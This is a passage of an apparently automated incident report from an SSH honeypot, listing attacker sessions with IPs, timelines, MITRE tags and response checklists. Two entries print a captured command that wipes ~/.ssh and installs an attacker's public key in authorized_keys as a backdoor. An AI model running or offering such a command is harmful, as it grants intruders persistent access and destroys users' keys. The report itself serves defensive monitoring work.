- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e9db0cf020

| Field | Detail |
|---|---|
| **Source IP** | `95.188.91[.]101` |
| **First Seen** | 2026-09-25 11:47 |
| **Last Seen** | 2026-09-25 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:47:36` | `cowrie.session.connect` |
| `2026-09-25 11:47:36` | `cowrie.client.version` |
| `2026-09-25 11:47:36` | `cowrie.client.kex` |
| `2026-09-25 11:47:37` | `cowrie.login.success` |
| `2026-09-25 11:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.188.91[.]101` to AbuseIPDB if not already reported
- [ ] Block `95.188.91[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d77d660463

| Field | Detail |
|---|---|
| **Source IP** | `95.188.91[.]101` |
| **First Seen** | 2026-09-25 11:47 |
| **Last Seen** | 2026-09-25 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:47:37` | `cowrie.session.connect` |
| `2026-09-25 11:47:37` | `cowrie.client.version` |
| `2026-09-25 11:47:38` | `cowrie.client.kex` |
| `2026-09-25 11:47:38` | `cowrie.login.success` |
| `2026-09-25 11:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.188.91[.]101` to AbuseIPDB if not already reported
- [ ] Block `95.188.91[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cde4b9a7f53

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-25 11:48 |
| **Last Seen** | 2026-09-25 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:48:03` | `cowrie.session.connect` |
| `2026-09-25 11:48:03` | `cowrie.client.version` |
| `2026-09-25 11:48:03` | `cowrie.client.kex` |
| `2026-09-25 11:48:04` | `cowrie.login.success` |
| `2026-09-25 11:48:04` | `cowrie.direct-tcpip.request` |
| `2026-09-25 11:48:04` | `cowrie.direct-tcpip.data` |
| `2026-09-25 11:48:04` | `cowrie.direct-tcpip.request` |
| `2026-09-25 11:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b4985a03fc9

| Field | Detail |
|---|---|
| **Source IP** | `122.15.129[.]26` |
| **First Seen** | 2026-09-25 11:52 |
| **Last Seen** | 2026-09-25 11:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:52:03` | `cowrie.session.connect` |
| `2026-09-25 11:52:03` | `cowrie.client.version` |
| `2026-09-25 11:52:03` | `cowrie.client.kex` |
| `2026-09-25 11:52:04` | `cowrie.login.success` |
| `2026-09-25 11:52:05` | `cowrie.session.params` |
| `2026-09-25 11:52:05` | `cowrie.command.input` |
| `2026-09-25 11:52:05` | `cowrie.command.failed` |
| `2026-09-25 11:52:05` | `cowrie.log.closed` |
| `2026-09-25 11:52:06` | `cowrie.session.params` |
| `2026-09-25 11:52:06` | `cowrie.command.input` |
| `2026-09-25 11:52:06` | `cowrie.session.file_download` |
| `2026-09-25 11:52:06` | `cowrie.log.closed` |
| `2026-09-25 11:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.15.129[.]26` to AbuseIPDB if not already reported
- [ ] Block `122.15.129[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fc55b7a3df

| Field | Detail |
|---|---|
| **Source IP** | `122.15.129[.]26` |
| **First Seen** | 2026-09-25 11:52 |
| **Last Seen** | 2026-09-25 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:52:06` | `cowrie.session.connect` |
| `2026-09-25 11:52:06` | `cowrie.client.version` |
| `2026-09-25 11:52:06` | `cowrie.client.kex` |
| `2026-09-25 11:52:07` | `cowrie.login.success` |
| `2026-09-25 11:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.15.129[.]26` to AbuseIPDB if not already reported
- [ ] Block `122.15.129[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b682e49f5f6

| Field | Detail |
|---|---|
| **Source IP** | `122.15.129[.]26` |
| **First Seen** | 2026-09-25 11:52 |
| **Last Seen** | 2026-09-25 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:52:07` | `cowrie.session.connect` |
| `2026-09-25 11:52:07` | `cowrie.client.version` |
| `2026-09-25 11:52:08` | `cowrie.client.kex` |
| `2026-09-25 11:52:08` | `cowrie.login.success` |
| `2026-09-25 11:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.15.129[.]26` to AbuseIPDB if not already reported
- [ ] Block `122.15.129[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76de50294523

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-25 11:52 |
| **Last Seen** | 2026-09-25 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:52:36` | `cowrie.session.connect` |
| `2026-09-25 11:52:36` | `cowrie.client.version` |
| `2026-09-25 11:52:36` | `cowrie.client.kex` |
| `2026-09-25 11:52:37` | `cowrie.login.success` |
| `2026-09-25 11:52:37` | `cowrie.direct-tcpip.request` |
| `2026-09-25 11:52:37` | `cowrie.direct-tcpip.data` |
| `2026-09-25 11:52:38` | `cowrie.direct-tcpip.request` |
| `2026-09-25 11:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d06436556079

| Field | Detail |
|---|---|
| **Source IP** | `160.251.202[.]248` |
| **First Seen** | 2026-09-25 11:54 |
| **Last Seen** | 2026-09-25 11:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:54:29` | `cowrie.session.connect` |
| `2026-09-25 11:54:29` | `cowrie.client.version` |
| `2026-09-25 11:54:29` | `cowrie.client.kex` |
| `2026-09-25 11:54:30` | `cowrie.login.success` |
| `2026-09-25 11:54:31` | `cowrie.session.params` |
| `2026-09-25 11:54:31` | `cowrie.command.input` |
| `2026-09-25 11:54:31` | `cowrie.command.failed` |
| `2026-09-25 11:54:31` | `cowrie.log.closed` |
| `2026-09-25 11:54:32` | `cowrie.session.params` |
| `2026-09-25 11:54:32` | `cowrie.command.input` |
| `2026-09-25 11:54:32` | `cowrie.session.file_download` |
| `2026-09-25 11:54:32` | `cowrie.log.closed` |
| `2026-09-25 11:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.202[.]248` to AbuseIPDB if not already reported
- [ ] Block `160.251.202[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8239a60ac5ec

| Field | Detail |
|---|---|
| **Source IP** | `160.251.202[.]248` |
| **First Seen** | 2026-09-25 11:54 |
| **Last Seen** | 2026-09-25 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:54:32` | `cowrie.session.connect` |
| `2026-09-25 11:54:32` | `cowrie.client.version` |
| `2026-09-25 11:54:33` | `cowrie.client.kex` |
| `2026-09-25 11:54:33` | `cowrie.login.success` |
| `2026-09-25 11:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.202[.]248` to AbuseIPDB if not already reported
- [ ] Block `160.251.202[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae34ede7f25d

| Field | Detail |
|---|---|
| **Source IP** | `160.251.202[.]248` |
| **First Seen** | 2026-09-25 11:54 |
| **Last Seen** | 2026-09-25 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:54:34` | `cowrie.session.connect` |
| `2026-09-25 11:54:34` | `cowrie.client.version` |
| `2026-09-25 11:54:34` | `cowrie.client.kex` |
| `2026-09-25 11:54:35` | `cowrie.login.success` |
| `2026-09-25 11:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.202[.]248` to AbuseIPDB if not already reported
- [ ] Block `160.251.202[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a680ff140102

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-25 12:01 |
| **Last Seen** | 2026-09-25 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:01:04` | `cowrie.session.connect` |
| `2026-09-25 12:01:05` | `cowrie.client.version` |
| `2026-09-25 12:01:05` | `cowrie.client.kex` |
| `2026-09-25 12:01:05` | `cowrie.login.success` |
| `2026-09-25 12:01:06` | `cowrie.direct-tcpip.request` |
| `2026-09-25 12:01:06` | `cowrie.direct-tcpip.data` |
| `2026-09-25 12:01:06` | `cowrie.direct-tcpip.request` |
| `2026-09-25 12:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0e3248e092

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:07` | `cowrie.session.connect` |
| `2026-09-25 12:07:07` | `cowrie.client.version` |
| `2026-09-25 12:07:07` | `cowrie.client.kex` |
| `2026-09-25 12:07:08` | `cowrie.login.success` |
| `2026-09-25 12:07:09` | `cowrie.session.params` |
| `2026-09-25 12:07:09` | `cowrie.command.input` |
| `2026-09-25 12:07:09` | `cowrie.log.closed` |
| `2026-09-25 12:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e74ebfb090

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:12` | `cowrie.session.connect` |
| `2026-09-25 12:07:12` | `cowrie.client.version` |
| `2026-09-25 12:07:13` | `cowrie.client.kex` |
| `2026-09-25 12:07:14` | `cowrie.login.success` |
| `2026-09-25 12:07:15` | `cowrie.session.params` |
| `2026-09-25 12:07:15` | `cowrie.command.input` |
| `2026-09-25 12:07:15` | `cowrie.log.closed` |
| `2026-09-25 12:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f7e0543196

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:15` | `cowrie.session.connect` |
| `2026-09-25 12:07:15` | `cowrie.client.version` |
| `2026-09-25 12:07:15` | `cowrie.client.kex` |
| `2026-09-25 12:07:17` | `cowrie.login.success` |
| `2026-09-25 12:07:18` | `cowrie.session.params` |
| `2026-09-25 12:07:18` | `cowrie.command.input` |
| `2026-09-25 12:07:19` | `cowrie.log.closed` |
| `2026-09-25 12:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6d73a739d3

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:19` | `cowrie.session.connect` |
| `2026-09-25 12:07:19` | `cowrie.client.version` |
| `2026-09-25 12:07:19` | `cowrie.client.kex` |
| `2026-09-25 12:07:20` | `cowrie.login.success` |
| `2026-09-25 12:07:21` | `cowrie.session.params` |
| `2026-09-25 12:07:21` | `cowrie.command.input` |
| `2026-09-25 12:07:21` | `cowrie.log.closed` |
| `2026-09-25 12:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e305a4f016c

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:22` | `cowrie.session.connect` |
| `2026-09-25 12:07:22` | `cowrie.client.version` |
| `2026-09-25 12:07:23` | `cowrie.client.kex` |
| `2026-09-25 12:07:25` | `cowrie.login.success` |
| `2026-09-25 12:07:26` | `cowrie.session.params` |
| `2026-09-25 12:07:26` | `cowrie.command.input` |
| `2026-09-25 12:07:26` | `cowrie.log.closed` |
| `2026-09-25 12:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0416636defae

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:27` | `cowrie.session.connect` |
| `2026-09-25 12:07:27` | `cowrie.client.version` |
| `2026-09-25 12:07:28` | `cowrie.client.kex` |
| `2026-09-25 12:07:30` | `cowrie.login.success` |
| `2026-09-25 12:07:31` | `cowrie.session.params` |
| `2026-09-25 12:07:31` | `cowrie.command.input` |
| `2026-09-25 12:07:31` | `cowrie.log.closed` |
| `2026-09-25 12:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05f89380f49

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:31` | `cowrie.session.connect` |
| `2026-09-25 12:07:31` | `cowrie.client.version` |
| `2026-09-25 12:07:31` | `cowrie.client.kex` |
| `2026-09-25 12:07:34` | `cowrie.login.success` |
| `2026-09-25 12:07:35` | `cowrie.session.params` |
| `2026-09-25 12:07:35` | `cowrie.command.input` |
| `2026-09-25 12:07:35` | `cowrie.log.closed` |
| `2026-09-25 12:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb91fca2b35

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:36` | `cowrie.session.connect` |
| `2026-09-25 12:07:36` | `cowrie.client.version` |
| `2026-09-25 12:07:36` | `cowrie.client.kex` |
| `2026-09-25 12:07:40` | `cowrie.login.success` |
| `2026-09-25 12:07:41` | `cowrie.session.params` |
| `2026-09-25 12:07:41` | `cowrie.command.input` |
| `2026-09-25 12:07:41` | `cowrie.log.closed` |
| `2026-09-25 12:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54dfcec1540

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:41` | `cowrie.session.connect` |
| `2026-09-25 12:07:41` | `cowrie.client.version` |
| `2026-09-25 12:07:42` | `cowrie.client.kex` |
| `2026-09-25 12:07:43` | `cowrie.login.success` |
| `2026-09-25 12:07:44` | `cowrie.session.params` |
| `2026-09-25 12:07:44` | `cowrie.command.input` |
| `2026-09-25 12:07:44` | `cowrie.log.closed` |
| `2026-09-25 12:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5197859662

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:47` | `cowrie.session.connect` |
| `2026-09-25 12:07:47` | `cowrie.client.version` |
| `2026-09-25 12:07:48` | `cowrie.client.kex` |
| `2026-09-25 12:07:49` | `cowrie.login.success` |
| `2026-09-25 12:07:50` | `cowrie.session.params` |
| `2026-09-25 12:07:50` | `cowrie.command.input` |
| `2026-09-25 12:07:51` | `cowrie.log.closed` |
| `2026-09-25 12:07:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ecb17f03736

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:51` | `cowrie.session.connect` |
| `2026-09-25 12:07:51` | `cowrie.client.version` |
| `2026-09-25 12:07:52` | `cowrie.client.kex` |
| `2026-09-25 12:07:53` | `cowrie.login.success` |
| `2026-09-25 12:07:55` | `cowrie.session.params` |
| `2026-09-25 12:07:55` | `cowrie.command.input` |
| `2026-09-25 12:07:55` | `cowrie.log.closed` |
| `2026-09-25 12:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035c83802352

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:07 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:07:56` | `cowrie.session.connect` |
| `2026-09-25 12:07:56` | `cowrie.client.version` |
| `2026-09-25 12:07:56` | `cowrie.client.kex` |
| `2026-09-25 12:07:58` | `cowrie.login.success` |
| `2026-09-25 12:07:59` | `cowrie.session.params` |
| `2026-09-25 12:07:59` | `cowrie.command.input` |
| `2026-09-25 12:08:01` | `cowrie.log.closed` |
| `2026-09-25 12:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c910a6b3cb

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:08 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 12:08:02` | `cowrie.session.connect` |
| `2026-09-25 12:08:02` | `cowrie.client.version` |
| `2026-09-25 12:08:03` | `cowrie.client.kex` |
| `2026-09-25 12:08:05` | `cowrie.login.success` |
| `2026-09-25 12:08:06` | `cowrie.session.params` |
| `2026-09-25 12:08:06` | `cowrie.command.input` |
| `2026-09-25 12:08:06` | `cowrie.log.closed` |
| `2026-09-25 12:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ebdcd28d30

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-25 12:08 |
| **Last Seen** | 2026-09-25 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
